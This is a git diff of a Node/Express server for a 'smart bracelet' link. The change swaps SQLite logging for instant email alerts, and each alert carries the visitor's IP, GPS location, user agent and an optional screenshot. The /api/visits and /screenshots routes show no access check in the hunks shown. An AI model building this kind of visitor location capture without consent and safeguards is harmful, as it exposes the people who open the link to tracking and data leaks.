@@ -1,7 +1,6 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
-const Database = require('better-sqlite3');
 const nodemailer = require('nodemailer');
 
 const app = express();
@@ -72,7 +71,7 @@ async function sendLocationEmail(visitData) {
                     </div>
 
                     <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
-                        <p><strong>🔢 ID de Registro:</strong> ${visitData.id}</p>
+                        <p><strong>🔢 ID de Registro:</strong> Email enviado en tiempo real</p>
                     </div>
                 </div>
 
@@ -98,35 +97,18 @@ async function sendLocationEmail(visitData) {
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
-// Crear carpeta de logs si no existe
+// Crear carpeta de logs si no existe (solo para capturas, opcional)
 const logsDir = path.join(__dirname, 'logs');
 const screenshotsDir = path.join(__dirname, 'logs', 'screenshots');
+
 if (!fs.existsSync(logsDir)) {
-    fs.mkdirSync(logsDir);
+    fs.mkdirSync(logsDir, { recursive: true });
 }
 if (!fs.existsSync(screenshotsDir)) {
-    fs.mkdirSync(screenshotsDir);
+    fs.mkdirSync(screenshotsDir, { recursive: true });
 }
 
-// Inicializar base de datos SQLite
-const db = new Database(path.join(__dirname, 'bracelet_tracking.db'));
-
-// Crear tabla si no existe
-db.exec(`
-    CREATE TABLE IF NOT EXISTS visits (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        timestamp TEXT NOT NULL,
-        ip TEXT NOT NULL,
-        latitude REAL,
-        longitude REAL,
-        accuracy REAL,
-        user_agent TEXT,
-        screenshot_file TEXT,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )
-`);
-
-console.log('✅ Base de datos inicializada correctamente');
+console.log('✅ Sistema inicializado - Modo solo EMAIL');
 
 // Función para obtener la IP real del visitante
 function getClientIP(req) {
@@ -143,7 +125,7 @@ app.get('/', (req, res) => {
 });
 
 // Ruta para registrar la visita con geolocalización
-app.post('/api/log-visit', (req, res) => {
+app.post('/api/log-visit', async (req, res) => {
     const ip = getClientIP(req);
     const timestamp = new Date().toISOString();
     const userAgent = req.headers['user-agent'];
@@ -151,13 +133,12 @@ app.post('/api/log-visit', (req, res) => {
 
     let screenshotFilename = null;
 
-    // Guardar captura si se envió
+    // Guardar captura si se envió (opcional)
     if (screenshot) {
         try {
             screenshotFilename = `screenshot_${Date.now()}.png`;
             const screenshotPath = path.join(screenshotsDir, screenshotFilename);
             
-            // Remover el prefijo 'data:image/png;base64,'
             const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
             fs.writeFileSync(screenshotPath, base64Data, 'base64');
         } catch (error) {
@@ -165,59 +146,45 @@ app.post('/api/log-visit', (req, res) => {
         }
     }
 
-    // Guardar en base de datos
+    console.log('📍 Nueva visita detectada:', {
+        ip,
+        location: latitude && longitude ? `${latitude}, ${longitude}` : 'Sin ubicación',
+        screenshot: screenshotFilename ? '✓' : '✗'
+    });
+
+    // Preparar datos para el email
+    const visitData = {
+        timestamp,
+        ip,
+        latitude: latitude || null,
+        longitude: longitude || null,
+        accuracy: accuracy || null,
+        user_agent: userAgent,
+        screenshot_file: screenshotFilename
+    };
+
+    // Enviar email inmediatamente
     try {
-        const stmt = db.prepare(`
-            INSERT INTO visits (timestamp, ip, latitude, longitude, accuracy, user_agent, screenshot_file)
-            VALUES (?, ?, ?, ?, ?, ?, ?)
-        `);
+        const emailSent = await sendLocationEmail(visitData);
         
-        const result = stmt.run(
-            timestamp,
-            ip,
-            latitude || null,
-            longitude || null,
-            accuracy || null,
-            userAgent,
-            screenshotFilename
-        );
-
-        const visitId = result.lastInsertRowid;
-
-        console.log('✅ Visita registrada en BD:', {
-            id: visitId,
-            ip,
-            location: latitude && longitude ? `${latitude}, ${longitude}` : 'Sin ubicación',
-            screenshot: screenshotFilename ? '✓' : '✗'
-        });
-
-        // Enviar email con la información
-        const visitData = {
-            id: visitId,
-            timestamp,
-            ip,
-            latitude: latitude || null,
-            longitude: longitude || null,
-            accuracy: accuracy || null,
-            user_agent: userAgent,
-            screenshot_file: screenshotFilename
-        };
-
-        // Enviar email de forma asíncrona (no bloquear la respuesta)
-        sendLocationEmail(visitData).then(emailSent => {
-            if (emailSent) {
-                console.log('📧 Email enviado exitosamente');
-            }
-        });
-
+        if (emailSent) {
+            console.log('✅ Email enviado a:', EMAIL_TO);
+            res.json({ 
+                success: true, 
+                message: 'Ubicación capturada y notificación enviada por email'
+            });
+        } else {
+            res.json({ 
+                success: true, 
+                message: 'Ubicación capturada (email pendiente)'
+            });
+        }
+    } catch (error) {
+        console.error('❌ Error:', error);
         res.json({ 
             success: true, 
-            message: 'Visita registrada correctamente',
-            visitId: visitId
+            message: 'Ubicación capturada (error al enviar email)'
         });
-    } catch (error) {
-        console.error('Error guardando en BD:', error);
-        res.status(500).json({ success: false, message: 'Error al guardar' });
     }
 });
 
@@ -229,8 +196,15 @@ app.get('/dashboard', (req, res) => {
 // API para obtener las visitas registradas
 app.get('/api/visits', (req, res) => {
     try {
-        const visits = db.prepare('SELECT * FROM visits ORDER BY created_at DESC').all();
-        res.json(visits);
+        if (fs.existsSync(visitsFile)) {
+            const data = fs.readFileSync(visitsFile, 'utf8');
+            const visits = JSON.parse(data);
+            // Ordenar por más reciente primero
+            visits.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+            res.json(visits);
+        } else {
+            res.json([]);
+        }
     } catch (error) {
         console.error('Error obteniendo visitas:', error);
         res.status(500).json({ error: 'Error al obtener visitas' });
@@ -243,19 +217,20 @@ app.use('/screenshots', express.static(screenshotsDir));
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`
 ╔════════════════════════════════════════════════════════╗
-║  📍 Pulsera Inteligente - Sistema Iniciado           ║
+║  📍 Pulsera Inteligente - MODO EMAIL                  ║
 ╚════════════════════════════════════════════════════════╝
 
 📱 Link de la pulsera: http://localhost:${PORT}
-📊 Dashboard (solo para ti): http://localhost:${PORT}/dashboard
+📧 Notificaciones a: ${EMAIL_TO}
 
-⚠️  Para activar desde tu celular:
-    1. Asegúrate de estar en la misma red WiFi
-    2. Busca tu IP local (ipconfig en Windows)
-    3. Usa: http://TU_IP_LOCAL:${PORT}
-    4. Acepta los permisos de ubicación GPS
+⚠️  Para desplegar en Render:
+    Configura las variables de entorno:
+    - EMAIL_USER: tu-email@gmail.com
+    - EMAIL_PASS: contraseña-de-aplicacion-gmail
 
-💾 Base de datos: bracelet_tracking.db
-📁 Capturas guardadas en: ${screenshotsDir}
+💡 Cada vez que alguien abre el link:
+    ✅ Captura ubicación GPS
+    ✅ Envía email automático
+    ✅ NO guarda en base de datos
     `);
 });
